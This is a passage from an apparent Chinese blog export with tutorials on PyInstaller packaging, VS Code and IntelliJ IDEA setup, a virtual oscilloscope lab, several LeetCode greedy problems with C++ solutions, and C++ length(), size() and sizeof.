<p>话不多说，直接切入正题，关于python打包程序，我主要介绍用Pycharm编写代码并打包为exe。</p>
<h2 id="一：pycharm打包-py文件为-exe"><a href="#一：pycharm打包-py文件为-exe" class="headerlink" title="一：pycharm打包.py文件为.exe"></a>一：pycharm打包.py文件为.exe</h2><p><strong>1.安装pyinstaller</strong><br>方法1：可在终端安装，点击Terminal终端<br><img src="https://img-blog.csdnimg.cn/20200424113438172.png" alt=""><br>出现下图，输入<code>pip install pyinstaller</code>,点击enter即可<br><img src="https://img-blog.csdnimg.cn/20200424113724375.png" alt=""><br>方法2：点击File-&gt;settings(或者快捷键Ctrl+Alt+S)<br><img src="https://img-blog.csdnimg.cn/20200424114052625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>进入以下界面，按顺序点击（第一项可能不同，关键找到Python Interpreter）<br><img src="https://img-blog.csdnimg.cn/20200424114644668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>进入以下界面，点击右侧加号（红框）<br><img src="https://img-blog.csdnimg.cn/20200424114942949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>进入以下界面，在搜索栏键入pyinstaller，选中pyinstaller，点击下方的INSTALL PACKAGE<br><img src="https://img-blog.csdnimg.cn/20200424115228774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>出现下图即安装完毕<br><img src="https://img-blog.csdnimg.cn/20200424115345425.png" alt=""><br><strong>2.打包程序</strong><br>（1）点击Terminal终端<br><img src="https://gitee.com/wxpgitee/images/raw/master/20200424115641253.png" alt=""><br>（2）输入<code>pyinstaller -F -w  文件名.py</code>，然后enter<br>(其中文件名为你要打包的程序的名字，不要忘了加.py后缀）</p>
<p>参数说明：</p>
<p>-F：将所有库文件打包成一个exe</p>
<p>-w：隐藏黑色控制台窗口</p>
<p>如果不加-F参数会生成很多文件，但运行比较快。压缩后比单个exe文件小一点</p>
<p>加-F参数只生成一个exe文件，但运行慢<br>（3）接下来是打包时间<br><img src="https://img-blog.csdnimg.cn/20200424120403425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>当出现下图时，打包成功，打包的.exe文件就在下图红框标记的dist文件夹（可到相应位置查看运行）<br><img src="https://img-blog.csdnimg.cn/20200424120618183.png" alt=""></p>
<h2 id="二：为程序添加图标"><a href="#二：为程序添加图标" class="headerlink" title="二：为程序添加图标"></a>二：为程序添加图标</h2><p>1.首先要有.ico后缀的图片，可以直接搜索ico图标，也可用Photoshop自制（给出自制ico图标教程<a href="http://xinzhi.wenda.so.com/a/1521045881615698">链接</a>）</p>
<p>2.添加图标，同样给出教程<a href="https://blog.csdn.net/weixin_45523154/article/details/102588987">链接</a></p>
<h2 id="三：关于打包程序可能出现的问题及解决方法"><a href="#三：关于打包程序可能出现的问题及解决方法" class="headerlink" title="三：关于打包程序可能出现的问题及解决方法"></a>三：关于打包程序可能出现的问题及解决方法</h2><p>请看<a href="https://blog.csdn.net/qq_41997888/article/details/100101951">链接</a>，还是<a href="https://blog.csdn.net/GodLordGee/article/details/82463997">链接</a>依旧是<a href="https://blog.csdn.net/zuimengliu/article/details/78912919">链接</a>，<a href="https://www.cnblogs.com/coodream2009/p/10983329.html">链接</a>。</p>
<p>备注：此文仅为记录本人在打包程序时所得，希望对看到的人有帮助。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>关于vscode的安装使用汉化及插件推荐（内含如何设置透明主题）</title>
    <url>/article/7065087.html</url>
    <content><![CDATA[<h1 id="关于vscode的安装使用汉化及插件推荐（内含如何设置透明主题）"><a href="#关于vscode的安装使用汉化及插件推荐（内含如何设置透明主题）" class="headerlink" title="关于vscode的安装使用汉化及插件推荐（内含如何设置透明主题）"></a>关于vscode的安装使用汉化及插件推荐（内含如何设置透明主题）</h1><a id="more"></a>
<p>关于vscode的安装使用汉化及插件推荐（内含如何设置透明主题）</p>
<p><strong>1.vscode安装</strong><br>首先是下载<br>给出<a href="https://visualstudio.microsoft.com/zh-hans/downloads/">官网</a>，选择红框（我是Windows系统）<br><img src="https://img-blog.csdnimg.cn/20200425215230707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>接受，点击下一步<br><img src="https://img-blog.csdnimg.cn/20200425215320918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>选择安装位置，点击下一步<br><img src="https://img-blog.csdnimg.cn/20200425215333568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>点击下一步<br><img src="https://img-blog.csdnimg.cn/20200425215422924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>添加到path，点击下一步<br><img src="https://img-blog.csdnimg.cn/2020042521543866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>点击安装<br><img src="https://img-blog.csdnimg.cn/20200425215513238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://img-blog.csdnimg.cn/20200425215523207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://img-blog.csdnimg.cn/20200425215532914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""></p>
<p><strong>2.vscode简单实用</strong><br>1.安装拓展<br>点击红框部分，如何搜索即可<br><img src="https://img-blog.csdnimg.cn/2020042611342281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>2.vscode汉化<br>请看<a href="https://jingyan.baidu.com/article/a681b0de7654283b184346ea.html">链接</a><br>3.vscode透明主题<br>请看<a href="https://blog.csdn.net/seanxwq/article/details/81743804">链接</a><br>4.vscode插件推荐<br>请看<a href="https://www.jianshu.com/p/af33015b2c52">链接</a></p>
]]></content>
      <categories>
        <category>vscode</category>
      </categories>
      <tags>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title>关于Intellij IDEA 安装使用汉化及相关插件推荐</title>
    <url>/article/33e861d8.html</url>
    <content><![CDATA[<h1 id="关于Intellij-IDEA-安装使用汉化及相关插件推荐"><a href="#关于Intellij-IDEA-安装使用汉化及相关插件推荐" class="headerlink" title="关于Intellij IDEA 安装使用汉化及相关插件推荐"></a>关于Intellij IDEA 安装使用汉化及相关插件推荐</h1><a id="more"></a>
<p>关于Intellij IDEA 安装使用汉化及相关插件推荐</p>
<h2 id="步骤一：下载安装IDEA"><a href="#步骤一：下载安装IDEA" class="headerlink" title="步骤一：下载安装IDEA"></a>步骤一：下载安装IDEA</h2><p>1.下载Intellij IDEA<a href="https://www.jetbrains.com/idea/download/other.html">（官网下载）</a><br>IDEA分为旗舰版(Ultimate)和社区版(Community)，旗舰版功能较多但需要激活码（你懂的），社区版免费开源，对我来说足够了（在这里插一下，说实话我也想用旗舰版的，so我有一段时间就在网上搜旗舰版破解安装教程，说实话，或许以前可以，但现在真不行，白费时间，所以我建议下载社区版）<br><img src="https://gitee.com/wxpgitee/images/raw/master/20200423191918272.png" alt=""><br>选择红色方框进行下载（大约540MB），下载后双击运行（会出现以下界面），点击Next<br><img src="https://gitee.com/wxpgitee/images/raw/master/20200423191918272.png" alt=""><br>2.点击Next（因为我安装过了，顺便更新一下版本，所以会出现以下界面）<br><img src="https://gitee.com/wxpgitee/images/raw/master/20200423191918272.png" alt=""><br>3.点击Browse选择你想安装的文件夹，点击Next<br><img src="https://gitee.com/wxpgitee/images/raw/master/20200423191918272.png" alt=""><br>4.电脑32位的选第一个，64位的选第二个，点击Next</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/20200423191918272.png" alt=""><br>5.点击Install进行安装<br><img src="https://gitee.com/wxpgitee/images/raw/master/20200423191918272.png" alt=""><br>6.下图为安装时情景<br><img src="https://gitee.com/wxpgitee/images/raw/master/20200423192952694.png" alt=""><br>7.安装后，红框为运行IDEA（可选可不选），点击Finish完成安装<br><img src="https://gitee.com/wxpgitee/images/raw/master/20200423192952694.png" alt=""></p>
<h2 id="步骤二：Intellij-IDEA的汉化（提供两种方法）"><a href="#步骤二：Intellij-IDEA的汉化（提供两种方法）" class="headerlink" title="步骤二：Intellij IDEA的汉化（提供两种方法）"></a>步骤二：Intellij IDEA的汉化（提供两种方法）</h2><h3 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h3><p>1.下载汉化包（根据自己版本选择合适的汉化包，汉化包是兼容的，版本不一致也行）<br>链接: <a href="https://pan.baidu.com/s/14GWgmEDWIMtplg4LlQUOvg">https://pan.baidu.com/s/14GWgmEDWIMtplg4LlQUOvg</a> 提取码: 9rd5<br>2.将下载的汉化包放到安装目录下的“<strong>lib</strong>”文件夹中，删除原来的<strong>resources_en</strong>英文版文件</p>
<h3 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h3><p>1.打开IDEA（你可以创建项目，也可以直接在开始界面点击红框选择点击Settings -&gt; Plugins接下来同下）<br><img src="https://gitee.com/wxpgitee/images/raw/master/20200423192952694.png" alt=""><br>2.点击File -&gt; Settings -&gt; Plugins<br><img src="https://gitee.com/wxpgitee/images/raw/master/20200423192952694.png" alt=""><br><img src="https://gitee.com/wxpgitee/images/raw/master/20200423192952694.png" alt=""><br>3.在Markplace中搜索Chinese（Simplified）(就下图中的，太长了），点击Install<br><img src="https://gitee.com/wxpgitee/images/raw/master/20200423192952694.png" alt=""><br>4.点击Restart重启IDEA，插件生效<br><img src="https://gitee.com/wxpgitee/images/raw/master/20200424134214293.png" alt=""><br>关于其他插件下载安装同样可以在Markplace中Install</p>
<h2 id="步骤三：IDEA相关插件推荐"><a href="#步骤三：IDEA相关插件推荐" class="headerlink" title="步骤三：IDEA相关插件推荐"></a>步骤三：IDEA相关插件推荐</h2><h3 id="1-Material-Theme-UI"><a href="#1-Material-Theme-UI" class="headerlink" title="1.Material Theme UI"></a>1.Material Theme UI</h3><p><img src="https://gitee.com/wxpgitee/images/raw/master/20200424134214293.png" alt="在这里插入图片描述"><br>可以自行更换主题，让你的pycharm更炫酷</p>
<h3 id="2-activate-power-mode"><a href="#2-activate-power-mode" class="headerlink" title="2.activate-power-mode"></a>2.activate-power-mode</h3><p><img src="https://gitee.com/wxpgitee/images/raw/master/20200424134214293.png" alt=""><br>有了这个，打代码成了一种享受，打代码时有炫酷特效（原谅我截不了动图）<br><img src="https://gitee.com/wxpgitee/images/raw/master/20200424134214293.png" alt=""></p>
<h3 id="3-CodeGlance"><a href="#3-CodeGlance" class="headerlink" title="3.CodeGlance"></a>3.CodeGlance</h3><p><img src="https://gitee.com/wxpgitee/images/raw/master/20200424134214293.png" alt=""><br>使用后将一个代码小地图嵌入到编辑器窗格中。使用自定义颜色进行语法高亮，同时使用明暗主题。（截不了动图，反正就是好用）<br><img src="https://gitee.com/wxpgitee/images/raw/master/20200424134214293.png" alt=""></p>
<h3 id="4-Rainbow-Brackets"><a href="#4-Rainbow-Brackets" class="headerlink" title="4.Rainbow Brackets"></a>4.Rainbow Brackets</h3><p><img src="https://gitee.com/wxpgitee/images/raw/master/20200424132715670.png" alt=""><br>可以让你的代码块颜色高亮，且支持多种编程语言</p>
<h3 id="5-Translate"><a href="#5-Translate" class="headerlink" title="5.Translate"></a>5.Translate</h3><p><img src="https://gitee.com/wxpgitee/images/raw/master/20200424132715670.png" alt=""><br>从名字就可看出什么作用，只需鼠标右击出现下图<br><img src="https://gitee.com/wxpgitee/images/raw/master/20200424132715670.png" alt=""><br>点击Translate（或快捷键Ctrl+Shift+Y）</p>
<p>备注：此文仅为个人记录，希望对你们有作用</p>
]]></content>
  </entry>
  <entry>
    <title>大学物理虚拟实验之示波器实验</title>
    <url>/article/c4a29565.html</url>
    <content><![CDATA[<h1 id="大学物理虚拟实验之示波器实验"><a href="#大学物理虚拟实验之示波器实验" class="headerlink" title="大学物理虚拟实验之示波器实验"></a>大学物理虚拟实验之示波器实验</h1><a id="more"></a>
<p>主要记录一些基本操作及按钮功能</p>
<h2 id="实验1"><a href="#实验1" class="headerlink" title="实验1"></a>实验1</h2><p>1.进入平台<br><img src="https://img-blog.csdnimg.cn/20200517172609506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>2.连线<br><img src="https://img-blog.csdnimg.cn/20200517172705750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>3.点击开关<br><img src="https://img-blog.csdnimg.cn/20200517172734248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>出现下图<img src="https://img-blog.csdnimg.cn/2020051717280363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>4.调节辉度调节聚焦<br><img src="https://img-blog.csdnimg.cn/20200517172957790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>适当左击辉度按钮，主要是聚焦按钮（波要足够清晰并且细）<br><img src="https://img-blog.csdnimg.cn/2020051717314712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>5.调节波形大小<br>（1）粗调<br>点击下图按钮<br><img src="https://img-blog.csdnimg.cn/20200517173247437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>调节后<br><img src="https://img-blog.csdnimg.cn/20200517173354667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>（2）微调<br><img src="https://img-blog.csdnimg.cn/20200517174522511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>6.调节电平（如果你的波在不停动）<br>点击下图按钮<br><img src="https://img-blog.csdnimg.cn/20200517173456954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>7.调节波形宽度（调节时基）<br><img src="https://img-blog.csdnimg.cn/20200517173743871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>8.移动波的位置<br><img src="https://img-blog.csdnimg.cn/20200517174017103.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""></p>
<h2 id="实验2"><a href="#实验2" class="headerlink" title="实验2"></a>实验2</h2><p>实验1调节后就不要再调节了<br>1.连线<br><img src="https://img-blog.csdnimg.cn/202005171747598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>2.打开信号发生器<br><img src="https://img-blog.csdnimg.cn/20200517174831209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>3.调节至CH2通道<br><img src="https://img-blog.csdnimg.cn/2020051717495078.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>4.选择方波<br><img src="https://img-blog.csdnimg.cn/20200517175036343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""></p>
]]></content>
      <categories>
        <category>无处安放</category>
      </categories>
  </entry>
  <entry>
    <title>LeetCode刷题:605.种花问题</title>
    <url>/article/d4783519.html</url>
    <content><![CDATA[<h1 id="LeetCode刷题-605-种花问题"><a href="#LeetCode刷题-605-种花问题" class="headerlink" title="LeetCode刷题:605.种花问题"></a>LeetCode刷题:605.种花问题</h1><a id="more"></a>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>假设有一个很长的花坛，一部分地块种植了花，另一部分却没有。可是，花不能种植在相邻的地块上，它们会争夺水源，两者都会死去。</p>
<p>给你一个整数数组  flowerbed 表示花坛，由若干 0 和 1 组成，其中 0 表示没种植花，1 表示种植了花。另有一个数 n ，能否在不打破种植规则的情况下种入 n 朵花？能则返回 true ，不能则返回 false。</p>
<p><strong>示例 1：</strong></p>
<p>输入：flowerbed = [1,0,0,0,1], n = 1<br>输出：true</p>
<p><strong>示例 2：</strong></p>
<p>输入：flowerbed = [1,0,0,0,1], n = 2<br>输出：false</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2>]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode刷题:435.无重叠区间</title>
    <url>/article/4886200.html</url>
    <content><![CDATA[<h1 id="LeetCode刷题-435-无重叠区间"><a href="#LeetCode刷题-435-无重叠区间" class="headerlink" title="LeetCode刷题:435.无重叠区间"></a>LeetCode刷题:435.无重叠区间</h1><a id="more"></a>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个区间的集合，找到需要移除区间的最小数量，使剩余区间互不重叠。</p>
<p>注意:</p>
<p>可以认为区间的终点总是大于它的起点。<br>区间 [1,2] 和 [2,3] 的边界相互“接触”，但没有相互重叠。</p>
<p><strong>示例 1:</strong></p>
<p>输入: [ [1,2], [2,3], [3,4], [1,3] ]</p>
<p>输出: 1</p>
<p>解释: 移除 [1,3] 后，剩下的区间没有重叠。</p>
<p><strong>示例 2:</strong></p>
<p>输入: [ [1,2], [1,2], [1,2] ]</p>
<p>输出: 2</p>
<p>解释: 你需要移除两个 [1,2] 来使剩下的区间没有重叠。</p>
<p><strong>示例 3:</strong></p>
<p>输入: [ [1,2], [2,3] ]</p>
<p>输出: 0</p>
<p>解释: 你不需要移除任何区间，因为它们已经是无重叠的了。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>在选择要保留区间时，区间的结尾十分重要：选择的区间结尾越小，余留给其它区间的空间就越大，就越能保留更多的区间。因此，我们采取的贪心策略为，优先保留结尾小且不相交的区间。<br>具体实现方法为，先把区间按照结尾的大小进行增序排序，每次选择结尾最小且和前一个选<br>择的区间不重叠的区间。我们这里使用C++ 的Lambda，结合std::sort() 函数进行自定义排序。</p>
<p>需要根据实际情况判断按区间开头排序还是按区间结尾排序。</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int eraseOverlapIntervals(vector&lt;vector&lt;int&gt;&gt;&amp; intervals) &#123;</span><br><span class="line">        if (intervals.empty()) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        int n &#x3D; intervals.size();</span><br><span class="line">        sort(intervals.begin(), intervals.end(), [](vector&lt;int&gt; a, vector&lt;int&gt; b) &#123;</span><br><span class="line">        return a[1] &lt; b[1];</span><br><span class="line">        &#125;);</span><br><span class="line">        int total &#x3D; 0, prev &#x3D; intervals[0][1];</span><br><span class="line">        for (int i &#x3D; 1; i &lt; n; ++i) &#123;</span><br><span class="line">        if (intervals[i][0] &lt; prev) &#123;</span><br><span class="line">        ++total;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">        prev &#x3D; intervals[i][1];</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode刷题:135.分发糖果</title>
    <url>/article/b47abe2.html</url>
    <content><![CDATA[<h1 id="LeetCode刷题-135-分发糖果"><a href="#LeetCode刷题-135-分发糖果" class="headerlink" title="LeetCode刷题:135.分发糖果"></a>LeetCode刷题:135.分发糖果</h1><a id="more"></a>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>老师想给孩子们分发糖果，有 N 个孩子站成了一条直线，老师会根据每个孩子的表现，预先给他们评分。</p>
<p>你需要按照以下要求，帮助老师给这些孩子分发糖果：</p>
<p>每个孩子至少分配到 1 个糖果。<br>评分更高的孩子必须比他两侧的邻位孩子获得更多的糖果。<br>那么这样下来，老师至少需要准备多少颗糖果呢？</p>
<p><strong>示例 1：</strong></p>
<p>输入：[1,0,2]<br>输出：5<br>解释：你可以分别给这三个孩子分发 2、1、2 颗糖果。</p>
<p><strong>示例 2：</strong></p>
<p>输入：[1,2,2]<br>输出：4<br>解释：你可以分别给这三个孩子分发 1、2、1 颗糖果。<br>第三个孩子只得到 1 颗糖果，这已满足上述两个条件。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>把所有孩子的糖果数初始化为1；先从左往右遍历一遍，如果右边孩子的评分比左边的高，则右边孩子的糖果数更新为左边孩子的糖果数加1；再从右往左遍历一遍，如果左边孩子的评分比右边的高，且左边孩子当前的糖果数不大于右边孩子的糖果数，则左边孩子的糖果数更新为右边孩子的糖果数加1。</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">candy</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; ratings)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> size = ratings.size();</span><br><span class="line">    <span class="keyword">if</span> (size &lt; <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">num</span><span class="params">(size, <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; size; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ratings[i] &gt; ratings[i<span class="number">-1</span>]) &#123;</span><br><span class="line">    num[i] = num[i<span class="number">-1</span>] + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = size - <span class="number">1</span>; i &gt; <span class="number">0</span>; --i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ratings[i] &lt; ratings[i<span class="number">-1</span>]) &#123;</span><br><span class="line">    num[i<span class="number">-1</span>] = max(num[i<span class="number">-1</span>], num[i] + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> accumulate(num.begin(), num.end(), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>C++中length()、size()、sizeof()三者的区别</title>
    <url>/article/21ddb368.html</url>
    <content><![CDATA[<h1 id="C-中length-、size-、sizeof-三者的区别"><a href="#C-中length-、size-、sizeof-三者的区别" class="headerlink" title="C++中length()、size()、sizeof()三者的区别"></a>C++中length()、size()、sizeof()三者的区别</h1><a id="more"></a>
<h2 id="一、length-函数"><a href="#一、length-函数" class="headerlink" title="一、length()函数"></a>一、length()函数</h2><p>c++中，length()只是用来获取<strong>字符串</strong>的长度。</p>
<blockquote>
<p>例如：string str = “absdhffhf”,则str.length() = 9。</p>
</blockquote>
<h2 id="二、size-函数"><a href="#二、size-函数" class="headerlink" title="二、size()函数"></a>二、size()函数</h2><p>c++中，在获取字符串长度时，<strong>size()函数与length()函数作用相同</strong>。除此之外，size()函数还可以<strong>获取vector类型的长度</strong>。</p>
<blockquote>
<p>例如：vector \<int> num(15,2),则num.size() = 15。</p>
<p>例如：string str = “abcd”,则 str.size()=4。</p>
</blockquote>
<h2 id="三、sizeof-运算符"><a href="#三、sizeof-运算符" class="headerlink" title="三、sizeof()运算符"></a>三、sizeof()运算符</h2><p>sizeof()运算符用来<strong>求对象所占内存空间的大小</strong>。</p>
<blockquote>
<p>char c[] = “asdsds”;<br> char* cc = c;<br> char cn[40] = “asdsds”;<br> int a[] = {1,2,3,4,5,6};<br> int* aa = a;<br> cout &lt;&lt; sizeof(c) &lt;&lt; sizeof(cc) &lt;&lt; sizeof(<em>cc) &lt;&lt; sizeof(cn);<br> cout &lt;&lt; sizeof(a) &lt;&lt; sizeof(aa) &lt;&lt; sizeof(</em>aa);</p>
<p>结果输出：<br> sizeof(c) = 7          //c是数组，计算到’\0’位置，结果为6 * 1+1=7<br> sizeof(cc) = 8         //cc为指针类型，大小为8<br> sizeof(<em>cc) = 1        //</em>cc指向c的第一个字符，大小为1<br> sizeof(cn) = 40        //开辟40个char空间，大小为40 * 1=40<br> sizeof(a) = 24         //a是数组，但不需计算到’\0’，结果为6* 4=24<br> sizeof(aa) = 8         //aa为指针类型，大小为8<br> sizeof(<em>aa) = 4        //</em>aa指向a的第一个数字，大小为4</p>
</blockquote>
